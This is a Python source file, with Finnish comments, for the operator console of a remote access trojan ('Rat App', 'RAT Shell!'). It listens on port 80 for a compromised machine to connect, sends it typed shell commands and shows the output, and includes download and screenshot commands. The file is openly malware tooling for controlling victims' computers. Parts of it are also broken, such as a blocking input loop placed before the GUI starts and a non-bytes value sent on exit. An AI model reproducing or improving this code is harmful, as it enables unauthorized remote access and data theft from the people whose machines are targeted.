import tkinter as tk
from tkinter import ttk, Text
import tkinter
import socket
from commands import Commands
import subprocess

socket.setdefaulttimeout(15)

class MainServer(tk.Tk):
    def __init__(self, ip:str, port:int):
        super().__init__()
        self.ip = ip
        self.port = port
        
        #luodaan uusi socket objekti käyttämällä socket-funktiota
        # #af_inet == ipv4, sock_stream == tcp-yhteys
        # #bindataan ip & portti -> listen == maksimiyhteydet
        self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        #self.s.setsockopt(socket.AF_INET, socket.SO_REUSEADDR, 1)
        self.s.bind((self.ip, self.port))
        self.s.listen(1)
        print('[+] Waiting for connection...\n')
        self.client, self.client_addr = self.s.accept()
        #accept metodi palauttaa -> target == itse yhteys kohteeseen
        # # target_addr == tuple jossa index0 :ssa targetin ip ja index1:ssa väliaikaisportti
        print(f'[+] New connection from {self.client_addr[0]}')

        self.command = Commands(self)

        # configure the root window
        self.title('Rat App')
        self.iconbitmap('rat.ico')
        self.geometry('300x500+500+500')
        
        # label
        self.label = ttk.Label(self, text='RAT Shell!')
        self.label.pack()
        self.teksti = tkinter.Text(self, width=50, height=50)
        self.teksti.pack()
        #command = self.teksti.get('1.0', 'end').split('\n')[-2].encode()
        
        
        # button
        self.button = ttk.Button(self, text='Take the shot!', command=self.command.button_clicked)        
        self.button2 = ttk.Button(self, text='Or Shutdown!', command=self.command.button2_clicked)
        #self.button['command'] = self.button_clicked 
        self.button.pack(padx=20, pady=20)       
        self.button2.pack(padx=20, pady=(0, 20))

        def execute():
            command = str(self.teksti.get('1.0', 'end').split('\n')[-2])
            return command.encode()
                    # if command == b'exit':
                    #     exit()
                    #self.teksti.insert('end', f'\n{subprocess.getoutput(command)}')

        # command = self.teksti.bind('<Return>', lambda event :execute())
        while True:
                #encodataan stringgi byteiksi että voidaan kuljettaa kohteeseen
            command = self.teksti.bind('<Return>', lambda event :execute())
            command = input('>> ').encode()
            
                
            if command == b'exit':      #byteinä koska muutettiin se edellisellä rivillä
                self.client.send(self.command)    #vaikka lopetetaan niin kuitenkin tieto kohteeseen
                self.client.close()
                self.s.close()
                break
            elif command == b'':
                continue
            elif command == b'cls':
                self.command.clear_screen()
            elif command == (b'download'):
                self.client.send(command)
                self.command.download(self.client,command)
                # elif command.startswith(b'upload'):
                #     upload(target,command)
                #      continue
            elif command == b'screen':
                print('Taking screenshot')
                self.client.send(command)
            else:
                self.client.send(command)
                #4kilotavua (pitäisi riittää) dataa back & decodataan bytet stringeiksi
                result = self.client.recv(4096).decode('ISO-8859-1')
                #print(result)
                self.teksti.insert('end', result)

if __name__ == "__main__":
    with open('ip.txt', 'r') as iipee:
        iipee = iipee.readline()

    appi = MainServer(iipee, 80) #172.20.16.61 Jorma, 192.168.56.1 UbU
    appi.mainloop()
